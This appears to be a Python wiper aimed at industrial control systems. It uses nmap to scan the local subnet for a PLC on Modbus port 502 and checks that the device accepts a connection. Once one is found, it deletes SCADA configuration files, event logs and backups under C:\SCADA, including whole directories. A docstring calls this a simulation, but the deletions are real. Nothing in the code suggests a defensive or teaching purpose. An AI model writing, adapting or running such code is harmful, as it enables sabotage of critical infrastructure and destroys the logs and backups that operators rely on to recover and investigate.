import os
import shutil
import socket
import struct
import fcntl
import nmap

def get_local_ip():
    """Fetch the local machine's IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("1.1.1.1", 80))  # Connecting to an external server
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

def get_subnet(ip):
    """Convert IP to subnet format (assumes /24 network)."""
    return ".".join(ip.split(".")[:-1]) + ".0/24"

def find_plc():
    """Scan for a PLC on the local network."""
    local_ip = get_local_ip()
    subnet = get_subnet(local_ip)
    
    scanner = nmap.PortScanner()
    scanner.scan(hosts=subnet, arguments='-p 502 --open')  # Scan for Modbus TCP (Port 502)

    for host in scanner.all_hosts():
        if scanner[host].has_tcp(502):  # Check if Modbus TCP port is open
            print(f"Found PLC at IP: {host}")
            return host
    
    print("No PLC found on the network.")
    return None

def establish_plc_connection(plc_ip):
    """Attempt to connect to the PLC to verify its presence."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((plc_ip, 502))  # Modbus TCP connection attempt
        s.close()
        print(f"Successfully connected to PLC at {plc_ip}.")
        return True
    except socket.error:
        print(f"Failed to connect to PLC at {plc_ip}.")
        return False

def destroy_data():
    """Simulate data destruction on the local system."""
    critical_files = [
        "C:\\SCADA\\configs\\plc_config.dat",
        "C:\\SCADA\\logs\\event_logs.log",
        "C:\\SCADA\\backups\\backup1.bak",
    ]

    for file in critical_files:
        if os.path.exists(file):
            try:
                os.remove(file)
                print(f"Deleted: {file}")
            except Exception as e:
                print(f"Failed to delete {file}: {e}")

    critical_dirs = [
        "C:\\SCADA\\backups",
        "C:\\SCADA\\logs",
    ]

    for dir_path in critical_dirs:
        if os.path.exists(dir_path):
            try:
                shutil.rmtree(dir_path)
                print(f"Deleted directory: {dir_path}")
            except Exception as e:
                print(f"Failed to delete directory {dir_path}: {e}")

def main():
    plc_ip = find_plc()
    
    if plc_ip and establish_plc_connection(plc_ip):
        print("Proceeding with data destruction...")
        destroy_data()
    else:
        print("PLC communication failed. Aborting data destruction.")

if __name__ == "__main__":
    main()